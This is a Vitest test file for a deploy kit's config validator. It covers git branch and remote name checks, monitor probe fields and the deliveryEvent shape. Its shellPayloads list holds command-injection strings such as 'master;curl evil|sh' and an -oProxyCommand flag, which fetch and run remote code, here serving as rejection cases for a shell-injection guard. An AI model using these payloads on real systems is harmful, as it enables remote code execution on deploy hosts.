import { describe, it, expect } from 'vitest';
import { createRequire } from 'module';

const require = createRequire(__filename);
const kit = require('../index.js') as typeof import('../index');
const { validateConfig } = kit;

// PKG-82: these guards existed only for keys that were already validated
// (projectDir, sharedPaths, monitor probe url/headers). This file targets the
// three gaps that had NO coverage at all — a guard nobody has watched fail is
// decoration. Every case below both rejects the bad input (asserting on the
// specific message) and accepts the legitimate input (no false positives).

describe('config validation: branch/remote charset (shell-injection guard)', () => {
  // git pull --ff-only ${remote} ${branch} in deploy.js interpolates both
  // UNQUOTED into a command run on the target host over ssh.
  const shellPayloads = [
    'master;curl evil|sh',
    'master`curl evil|sh`',
    'master$(curl evil|sh)',
    'master && curl evil | sh',
    '-oProxyCommand=curl evil|sh', // leading "-" read as a flag by git
  ];

  it.each(shellPayloads)('rejects a branch containing shell metacharacters: %s', (bad) => {
    const problems = validateConfig({ branch: bad });
    expect(problems.join('\n')).toMatch(/"branch".*must be a valid git ref name/);
  });

  it.each(shellPayloads)('rejects a remote containing shell metacharacters: %s', (bad) => {
    const problems = validateConfig({ remote: bad });
    expect(problems.join('\n')).toMatch(/"remote".*must be a valid git ref name/);
  });

  it('rejects ".." and a trailing "/" in a branch name', () => {
    expect(validateConfig({ branch: 'feature/../etc' }).join()).toMatch(/"branch".*must be a valid git ref name/);
    expect(validateConfig({ branch: 'feature/' }).join()).toMatch(/"branch".*must be a valid git ref name/);
  });

  it('accepts legitimate branch names with no false positives', () => {
    expect(validateConfig({ branch: 'feature/foo-bar_1.2' })).toEqual([]);
    expect(validateConfig({ branch: 'release/v1.0' })).toEqual([]);
    expect(validateConfig({ branch: 'master' })).toEqual([]);
    expect(validateConfig({ branch: 'main' })).toEqual([]);
  });

  it('accepts a null branch (default: resolve origin/HEAD)', () => {
    expect(validateConfig({ branch: null })).toEqual([]);
  });

  it('accepts a legitimate remote name with no false positives', () => {
    expect(validateConfig({ remote: 'origin' })).toEqual([]);
    expect(validateConfig({ remote: 'upstream' })).toEqual([]);
  });
});

describe('config validation: monitor.publicProbes sub-fields', () => {
  const withProbe = (probe: any) => validateConfig({
    monitor: { alert: { command: 'notify' }, publicProbes: [{ id: 'api', url: 'https://app/health', ...probe }] },
  });

  it('rejects a non-numeric expectStatus', () => {
    expect(withProbe({ expectStatus: 'ok' }).join()).toMatch(/expectStatus must be an HTTP status code/);
  });

  it('rejects an out-of-range expectStatus', () => {
    expect(withProbe({ expectStatus: 99 }).join()).toMatch(/expectStatus must be an HTTP status code/);
    expect(withProbe({ expectStatus: 600 }).join()).toMatch(/expectStatus must be an HTTP status code/);
  });

  it('rejects an expectStatus array containing a bad entry', () => {
    expect(withProbe({ expectStatus: [200, 'nope'] }).join()).toMatch(/expectStatus must be an HTTP status code/);
  });

  it('rejects an empty expectStatus array', () => {
    expect(withProbe({ expectStatus: [] }).join()).toMatch(/expectStatus must be an HTTP status code/);
  });

  it('accepts a valid single or array expectStatus', () => {
    expect(withProbe({ expectStatus: 200 })).toEqual([]);
    expect(withProbe({ expectStatus: [200, 201, 204] })).toEqual([]);
  });

  it('rejects a non-string expectBodyIncludes', () => {
    expect(withProbe({ expectBodyIncludes: 42 }).join()).toMatch(/expectBodyIncludes must be a non-empty string/);
  });

  it('rejects an empty expectBodyIncludes', () => {
    expect(withProbe({ expectBodyIncludes: '' }).join()).toMatch(/expectBodyIncludes must be a non-empty string/);
  });

  it('accepts a valid expectBodyIncludes', () => {
    expect(withProbe({ expectBodyIncludes: '"status":"ok"' })).toEqual([]);
  });

  it('rejects a non-positive maxTimeSeconds', () => {
    expect(withProbe({ maxTimeSeconds: 0 }).join()).toMatch(/maxTimeSeconds must be a positive number/);
    expect(withProbe({ maxTimeSeconds: -5 }).join()).toMatch(/maxTimeSeconds must be a positive number/);
    expect(withProbe({ maxTimeSeconds: 'fast' }).join()).toMatch(/maxTimeSeconds must be a positive number/);
  });

  it('accepts a valid maxTimeSeconds', () => {
    expect(withProbe({ maxTimeSeconds: 5 })).toEqual([]);
  });

  it('accepts a fully valid probe with all optional sub-fields set', () => {
    expect(withProbe({ expectStatus: [200, 204], expectBodyIncludes: 'ok', maxTimeSeconds: 8 })).toEqual([]);
  });
});

describe('config validation: deliveryEvent inner shape', () => {
  it('rejects an unknown key (the "comand" typo this gap was found from)', () => {
    const problems = validateConfig({ deliveryEvent: { comand: 'npm run notify' } });
    expect(problems.join('\n')).toMatch(/unknown deliveryEvent key "comand"/);
    expect(problems.join('\n')).toMatch(/"deliveryEvent.command" must be a non-empty string/);
  });

  it('rejects a missing command', () => {
    expect(validateConfig({ deliveryEvent: {} }).join()).toMatch(/"deliveryEvent.command" must be a non-empty string/);
  });

  it('rejects an empty-string command', () => {
    expect(validateConfig({ deliveryEvent: { command: '   ' } }).join()).toMatch(/"deliveryEvent.command" must be a non-empty string/);
  });

  it('accepts a valid deliveryEvent', () => {
    expect(validateConfig({ deliveryEvent: { command: 'npx deploy-kit announce-discord' } })).toEqual([]);
  });

  it('accepts a null deliveryEvent (disabled, the default)', () => {
    expect(validateConfig({ deliveryEvent: null })).toEqual([]);
  });
});
